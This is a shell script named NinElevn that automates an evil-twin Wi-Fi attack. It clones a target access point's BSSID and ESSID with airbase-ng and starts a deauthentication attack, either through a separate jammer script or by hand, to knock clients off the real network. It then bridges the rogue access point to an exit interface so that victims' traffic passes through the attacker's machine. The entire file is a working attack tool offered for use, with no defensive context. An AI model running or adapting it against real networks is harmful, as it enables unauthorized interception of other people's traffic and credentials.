#!/bin/sh

#   NinElevn -- evil twin AP creator: global or single target
#   automatic set connection bridge on ----
#

# color codes
#red="\e[0;91m"
#blue="\e[0;94m"
#expand_bg="\e[K"
#blue_bg="\e[0;104m${expand_bg}"
#red_bg="\e[0;101m${expand_bg}"
#green_bg="\e[0;102m${expand_bg}"
#green="\e[0;92m"
#white="\e[0;97m"
#bold="\e[1m"
#uline="\e[4m"
#yellow="\e[1;33m"
#purple="\e[0;35m"
#cyan="\e[0;36m"
#reset="\e[0m"

# main script


# FUNCTION: start airbase service
airbase_clone() {
    read -p "|#     >> insert AP BSSID to emulate: " bssid
    read -p "|#     >> insert AP's name [remember quotes for sp. characters]: " essid
    export bssid
    export essid
    export iface
    printf "|#  good. starting up airbase-ng process...\n"
    xterm -hold 'airbase-ng -vv -a "$bssid" --essid $essid $iface' &
}
# FUNCTION: waiting mode
waiting_mode() {
    printf "|#      Entering waiting mode..."
    read -p "|#     >> Sleeping now. Press enter [twice] to continue"
    printf "|#      ...........system ready\n"
    read -p "|#     >> Press enter once again to confirm"
    printf "|#      proceeding...\n"
}

# main script
# boot and check if wireless card is in monitor mode
printf "|#  NinElevn is starting up...\n"
printf "|#  available wireless interfaces:\n"
printf "|#---------------------------------------\n"
iw dev | grep Interface | awk -F ' ' '{print$2}'
printf "|#---------------------------------------\n"
read -p "|#     >> what wireless interface do you wish to use? " iface
printf "|#  checking wireless card...\n"
allgood=$(iwconfig $iface | grep Monitor | awk -F ' ' '{print$4}' | awk -F ':' '{print$2}')
printf "|#     >> mode: $allgood\n"
    if [ $allgood == 'Monitor' ]
    then printf "|#  all good. going to start airbase-ng...\n" && airbase_clone
    else printf "|#  your wireless card is NOT in monitor mode, what do you think you're doing?\n" && printf "|#    >> exiting...\n" && exit 1
    fi
waiting_mode

# confirmation check
while true; do
    read -p "|#     >> has the attack started correctly? [y/n] " yn
    case $yn in
        [Yy]* ) printf "|#    good. keep it going...\n"; break;;
        [Nn]* ) printf "|#    oh, c'mon now. restarting...\n"; pkill xterm; sleep 1; airbase_clone;;
    esac
done

# deauth:
printf "|#  Evil twin up and running. Time for deauthentication:\n"
# FUNCTION: choice between AirJammer3000 / manual deauth attack [into a function, for recall]
airbase-ng_start() {
printf "|#      >> choose deauth metod: J for AirJammer3000 [aireplay-ng];\n"
printf "|#      >>                      M for manual mode;\n"
read -p "|#                              [j/m]: " jm
		case $jm in
			[Jj]* ) printf "|#      okay. opening jammer in another window...\n";
                    xterm +hold -e 'bash ./jammer.sh' &
                    ;;
			[Mm]* ) printf "|#      okay. let me get you a terminal to work with...\n";
                    xterm -hold &
                    ;;
		esac
printf "|#  Waiting for deauthentication to succeed...\n"
}

# actually starting it
airbase-ng_start
waiting_mode

# confirmation check
while true; do
    read -p "|#     >> has the deauth succeeded? [y/n] " ns
    case $ns in
        [Yy]* ) printf "|#    good. last step...\n"; break;;
        [Nn]* ) printf "|#    oh, dude. restarting...\n"; pkill --newest xterm; sleep 1; airbase-ng_start;;
    esac
done

# bridge set-up: variable declaration
printf "|#\n"
printf "|#  Time to create a bridge; interfaces available: \n"
ifconfig | grep UP | awk -F ":" '{print$1}'
read -p "|#     >> insert exit interface: " output
read -p "|#     insert bridge name [default is 'evil']: " br_name
br_name="${br_name:=evil}"
printf "|#  Creating bridge...\n"
# bridge_utils setup
brctl addbr $br_name
brctl addif $br_name $output
brctl addif $br_name at0
printf "|#  Bridge configured. Bringing $output up...\n"
ifconfig at0 0.0.0.0 up
ifconfig $br_name up
printf "|#  Done.\n"
read -p "|#     >> do you want to manually configure the DHCP?" ny
    case $ny in
        [Yy]* ) printf "|#      okay. let me get you another terminal...\n";
                    xterm -hold &
                    ;;
        [Nn]* ) printf "|#      okay. Setting ip addresses with dhclient...";
                    dhclient $br_name &
                    ;;
    esac
    
# done! (final checks)
